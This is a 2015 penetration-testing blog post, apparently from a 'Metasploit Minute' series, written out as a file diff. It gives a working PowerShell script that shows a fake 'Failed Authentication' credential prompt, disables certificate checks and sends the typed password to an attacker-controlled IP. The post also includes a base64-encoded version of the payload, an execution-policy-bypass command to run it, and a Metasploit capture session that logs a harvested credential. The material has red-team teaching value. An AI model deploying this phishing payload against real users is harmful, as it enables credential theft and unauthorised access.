@@ -1,0 +1,112 @@
+---
+layout: post
+title: "Powershell Popups + Capture"
+date: 2015-01-12 17:52:10 -0500
+comments: true
+categories: 
+---
+
+Metasploit Minute has entered into it's 3rd "season". And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)
+
+Here is the video:
+
+<iframe width="560" height="315" src="//www.youtube.com/embed/H_E3FNF8rBw" frameborder="0" allowfullscreen></iframe>
+
+Here is the code:
+
+```
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + "\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+$wc = new-object net.webclient;
+$wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
+$result = $wc.downloadstring('https://172.16.102.163');
+```
+
+Lets break down the code line by line:
+
+```
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserName,[Environment]::UserDomainName);
+```
+
+This tells windows to prompt for credentials, with the title of "Failed Authentication", no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.
+
+```
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+```
+
+Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later
+
+```
+$wc = new-object net.webclient;
+$wc.Headers.Add("User-Agent","Wget/1.9+cvs-stable (Red Hat modified)");
+```
+
+Creates a new webclient object and sets its user agent to 'wget'
+
+```
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+```
+
+Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.
+
+```
+$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
+```
+
+Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.
+
+```
+$result = $wc.downloadstring('https://172.16.102.163');
+```
+
+And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.
+
+```
+cat power.txt | iconv --to-code UTF-16LE | base64
+
+JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=
+```
+
+Then execute `powershell -ep bypass -enc <the encoded text from above>` and you get this:
+
+Image should be here: ![](/images/2014-09-03-powershellpopup.png)
+
+```
+root@wpad:~/metasploit-framework# ./msfconsole -Lq
+msf > use auxiliary/server/capture/http_basic 
+msf auxiliary(http_basic) > show options
+
+Module options (auxiliary/server/capture/http_basic):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   REALM        Secure Site      yes       The authentication realm you'd like to present.
+   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
+   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT      80               yes       The local port to listen on.
+   SSL          false            no        Negotiate SSL for incoming connections
+   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
+   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+   URIPATH                       no        The URI to use for this exploit (default is random)
+
+msf auxiliary(http_basic) > set SSL true
+SSL => true
+msf auxiliary(http_basic) > set SRVPORT 443
+SRVPORT => 443
+msf auxiliary(http_basic) > set URIPATH /
+URIPATH => /
+msf auxiliary(http_basic) > run
+[*] Auxiliary module execution completed
+msf auxiliary(http_basic) > 
+[*] Listening on 0.0.0.0:443...
+[*] Using URL: https://0.0.0.0:443/
+[*]  Local IP: https://172.16.102.163:443/
+[*] Server started.
+[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
+[+] 172.16.102.140 - Credential collected: "SITTINGDUCK\user:ASDqwe123" => /
+```
+
+Game over!
